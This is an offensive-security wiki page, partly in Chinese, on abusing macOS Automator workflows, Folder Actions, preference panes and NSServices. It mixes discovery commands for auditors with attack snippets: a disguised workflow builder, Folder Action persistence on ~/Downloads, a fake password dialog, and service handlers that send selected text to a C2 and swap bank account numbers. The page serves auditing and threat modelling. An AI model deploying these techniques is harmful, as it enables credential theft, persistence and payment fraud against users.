# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** 是 macOS 的可视化自动化工具。它执行由 **actions**（`.action` bundles）组成的 **workflows**（`.workflow` bundles）。Automator 也支持 **Folder Actions**、**Quick Actions** 和 **Shortcuts** 集成。在现代 macOS 上，workflows 还可以被 **导入到 Shortcuts**，因此同样的恶意逻辑可能会以 Finder Quick Action、位于 `~/Library/Services/` 下的用户服务，或基于旧版 Automator actions 的 shortcut 形式出现。

Automator actions 是在 workflow 执行时加载到 Automator runtime 中的 **plugins**。它们可以：
- 执行任意 shell scripts
- 处理文件和数据
- 通过 AppleScript 与 applications 交互
- 串联起来实现复杂自动化

### Why This Matters

> [!WARNING]
> Automator workflows 可以被 **social-engineered** 诱导执行 —— 它们看起来只是简单的 document files。`.workflow` bundle 可以包含嵌入的 shell commands，在 workflow 运行时执行。结合 Folder Actions，它们提供了会在 file events 触发时执行的 **automatic persistence**。近期的 Gatekeeper 修复也表明，**app-bundled Quick Actions**（`Contents/PlugIns/*.workflow`）必须被视为可执行内容，而不是无害数据。

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### 攻击：Social-Engineered Workflow

一个 `.workflow` bundle 对大多数用户来说看起来像一个普通的文档文件：
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### 攻击：Folder Action 持久化

Folder Actions 会在文件被添加到受监控的文件夹时自动执行一个 workflow:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions 在重启后仍会持续存在并静默执行。`~/Downloads` 上的 Folder Action 意味着 **每个下载的文件都会触发你的 payload** —— 包括来自 Safari、Chrome、AirDrop 和邮件附件的文件。另请注意，`System Events` 可以注册指向默认 `~/Library/Scripts/Folder Action Scripts` 位置之外脚本的 Folder Actions，这使得对 loose-path 的 hunting 很有价值。有关相关的 TCC 影响，请查看 [the TCC page](../macos-security-protections/macos-tcc/README.md)。

---

## Preference Panes

### Basic Information

Preference panes（`.prefPane` bundles）是从 **System Settings**（以前的 System Preferences）加载的插件。它们为系统或第三方功能提供配置 UI 面板。在旧系统上，它们由 `System Preferences` 直接加载；在较新的版本中，第三方 panes 通常由从 System Settings 启动的 **legacy loader XPC service** 代理加载。

### Why This Matters

- Preference panes 在由 System Settings / System Preferences 启动的 **trusted host process** 中执行
- 在现代系统上，该 host 可能是一个 **`legacyLoader` XPC service**，因此重要的边界仍然是 **trusted Apple UI process -> third-party code loading**
- 第三方 preference panes 会继承 **host process security context** 以及附加到该 UI 的用户信任
- 用户通过 **double-clicking** 安装 preference panes —— 很容易进行 social engineering
- 安装后，它们会**持久化**，并在每次打开该面板时加载

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### 攻击：Privilege Context Hijacking

恶意 preference pane 会继承 **pane host** 的安全上下文（历史上是 `System Preferences`，在较新的版本中通常是由 `System Settings` 启动的 `legacyLoader` helper）：
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### 攻击：通过安装实现持久化
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### 攻击：UI Phishing

一个 preference pane 可以模仿合法的 system UI 面板来**钓取凭证**：
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** 允许应用程序通过 **Services menu**（右键 → Services）向其他应用提供功能。当用户选中文本或数据并调用某个 service 时，所选数据会被 **发送给服务提供方** 进行处理。

Services 在应用程序的 `Info.plist` 中通过 `NSServices` 键声明，并与 pasteboard server（`pbs`）注册。macOS 还会维护一个 **service cache** 和一个 **restriction policy**，用来决定哪些 services 可见，以及 sandboxed 调用者是否应收到额外警告。

### Why This Matters

- Services 接收 **cross-application data flow** — 来自任意应用的选中文本都会发送给 service
- 恶意 service 可以从 password managers、email clients、financial apps 中捕获数据
- Services 可以向调用应用 **返回修改后的数据**（在选择操作上的 man-in-the-middle）
- Service 名称可以伪装得看起来很合法（"Format Text", "Encrypt Selection", "Share"）
- 可选的 `NSRestricted` 标志与安全相关：标记为 unrestricted 的 service 可能会被 sandboxed app 调用，而不会像 macOS 对逃逸风险较高的 services 那样显示警告

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### 攻击：Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### 攻击：数据修改（Man-in-the-Middle）

一个服务可以在**修改返回的数据**的同时，看起来仍在提供合法功能：
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple supports an optional `NSRestricted` boolean per service definition. If it is set, macOS warns sandboxed callers because the service may help them **escape sandbox or privacy boundaries**. From an offensive perspective, this gives two useful audit paths:

- Look for **third-party services not marked as restricted** even though they proxy Apple Events, file access, or other privileged actions
- Look for **high-value built-in services** with strong entitlements (for example, services exposed by Script Editor or Finder-backed helpers) and check whether user interaction is enough to turn them into a data-access primitive

A good recent example is **CVE-2022-48574**, where the Services mechanism could be abused to reach **TCC-protected user files without the expected confirmation flow**. The bug is fixed, but the technique remains useful for threat modeling: any service that forwards file access or automation requests on behalf of the caller deserves the same scrutiny.

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple fixed a Gatekeeper bypass in 2024 where an app-bundled Automator Quick Action could run without normal assessment. When auditing apps, inspect `Contents/PlugIns/*.workflow/Contents/document.wflow` exactly like you would inspect helper scripts or login items. See [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts can inherit legacy Automator behavior**: Apple also added an additional user-consent prompt after third-party shortcuts were found using a **legacy Automator action** to send Apple Events without the expected permission flow. Imported workflows and shortcut bundles should be reviewed for `Run AppleScript`, `Run Shell Script`, and similar bridge actions. See [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: Apple shipped another Automator fix in 2025 for access to protected user data. Even if Automator is a legacy surface, treat any workflow runner, Quick Action host, or automation bridge as a current attack surface rather than dead code.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### 偏好设置面板 → TCC 提权
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → 密码管理器窃取
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## 参考

* [Apple — 关于 macOS Ventura 13.7、Sonoma 14.7 和 Sequoia 15 的安全内容](https://support.apple.com/en-us/121238)
* [Moonlock — NSServices 漏洞在 macOS 上是如何工作的](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
